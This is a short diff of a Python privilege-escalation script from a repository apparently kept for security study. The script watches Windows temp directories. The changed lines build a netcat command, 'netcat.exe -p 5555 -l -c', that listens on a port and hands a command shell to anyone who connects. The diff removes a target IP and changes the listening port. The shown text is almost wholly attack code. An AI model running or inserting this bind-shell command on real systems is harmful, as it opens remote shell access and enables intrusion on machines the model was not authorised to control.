@@ -11,8 +11,8 @@ FILE_RENAMED_FROM = 4
 FILE_RENAMED_TO = 5
 
 NETCAT = 'C:\\Users\\User\\Documents\\GitHub\\Ethical-Python-Tools\\Escalation-Studies\\netcat.exe'
-TGT_IP = '192.168.1.185'
-cmd = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'
+
+cmd = f'{NETCAT} -p 5555 -l -c'
 
 FILE_LIST_DIRECTORY = 0x0001
 PATHS = ['c:\\WINDOWS\\Temp',tempfile.gettempdir()]#Define our list of directories
